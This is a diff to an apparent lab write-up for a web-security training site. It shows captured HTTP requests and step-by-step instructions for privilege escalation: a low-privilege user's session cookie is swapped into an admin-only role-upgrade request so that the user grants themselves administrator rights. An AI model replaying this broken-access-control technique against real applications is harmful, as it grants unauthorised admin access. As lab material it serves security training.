@@ -41,9 +41,9 @@ If the target user is an application administrator, then the attacker will gain 
     
 ## LAB
  
- ## 1. Step
+ ## 1. STEP
   Asif Is Upgrade User 
-  Login in and Caputer The Request In Burp Repeter and  analyze the Request
+  Login in the login page and Caputer The Request In Burp Repeter and  analyze the Request
     
      POST /admin-roles HTTP/1.1
     Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
@@ -67,6 +67,39 @@ If the target user is an application administrator, then the attacker will gain 
     action=upgrade&confirmed=true&username=asif
     
 
+ ## 2.STEP
+ Khan Is Local user Log
+ Login in the login page and Caputer The Request In Burp Repeter and  analyze the Request 
+ 
+     GET /my-account?id=khan HTTP/1.1
+     Host: acca1f871ff59314c0b1124d00580002.web-security-academy.net
+     Cookie: session=dhb7aRHg7lEnRb2uRogyfXu2onwMp2jY
+     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+     Accept-Language: en-US,en;q=0.5
+     Accept-Encoding: gzip, deflate
+     Referer: https://acca1f871ff59314c0b1124d00580002.web-security-academy.net/my-account
+     Upgrade-Insecure-Requests: 1
+     Sec-Fetch-Dest: document
+     Sec-Fetch-Mode: navigate
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-User: ?1
+    Te: trailers
+    Connection: close
 
+ 
+  ## 3.STEP 
+  First some Changing Copy Local user Cookie: Session and past the Upgrade Request and Secand is Change the Nmae just Example 
+  Upgrade user name is Asif to change and type khan and send the Request Server and Local user is Upgrade This vulnerabilities
+  IS Access-control-vulnerabilities
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
 
 
